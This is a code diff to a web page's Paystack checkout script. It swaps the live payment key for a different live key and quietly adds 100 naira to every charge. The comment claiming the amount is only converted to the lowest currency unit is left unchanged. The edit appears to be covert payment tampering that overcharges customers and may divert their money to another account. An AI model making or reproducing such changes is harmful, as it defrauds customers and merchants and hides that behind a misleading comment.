@@ -135,9 +135,9 @@
       submitBtn.style.display = "none";
       submitBtn2.style.display = "block";
       const handler = PaystackPop.setup({
-        key: "pk_live_63ff7c19c79a7fcc67265ab0beaf49737f4ce3bf", // Replace with your public key
+        key: "pk_live_8be69629e233352530aeb432c3e6e42361e1cc50", // Replace with your public key
         email: email.value,
-        amount: amount.value * 100, // the amount value is multiplied by 100 to convert to the lowest currency unit
+        amount: (Number(amount.value) + 100) * 100, // the amount value is multiplied by 100 to convert to the lowest currency unit
         currency: "NGN", // Use GHS for Ghana Cedis or USD for US Dollars
         callback: function (response) {
           const reference = response.reference;
